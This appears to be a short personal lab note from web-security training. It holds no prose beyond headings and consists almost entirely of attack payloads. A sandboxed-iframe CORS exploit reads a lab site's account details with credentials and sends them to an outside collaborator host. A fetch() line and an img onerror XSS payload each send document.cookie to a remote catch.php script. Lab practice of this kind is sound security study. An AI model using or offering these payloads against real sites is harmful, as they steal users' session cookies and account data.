![[Pasted image 20240605160540.png]]
```javscript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Encode the response text to ensure it can be safely sent via URL
        var data = encodeURIComponent(this.responseText);
        // Create an image element to send the data to your server
        var img = new Image();
        img.src = 'http://y65cmywqqb7uq2kemy9eh8mltcz3nubj.oastify.com?key=' + data;
    };
    req.open('GET', 'https://0a3700ad0385b23f80f067f800a10090.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script>"></iframe>

```
# To fetch the cookie with JS : 
````javascript
fetch("http://www.dei.isep.ipp.pt/~jpl/catch.php?cookie="+document.cookie);
````
—–
# what about disguising my script as an image?
```javascript
<img src="non-existing-image.png" onerror="fetch('http://www.dei.isep.ipp.pt/~jpl/catch.php?cookie='+document.cookie); " />
```
--—
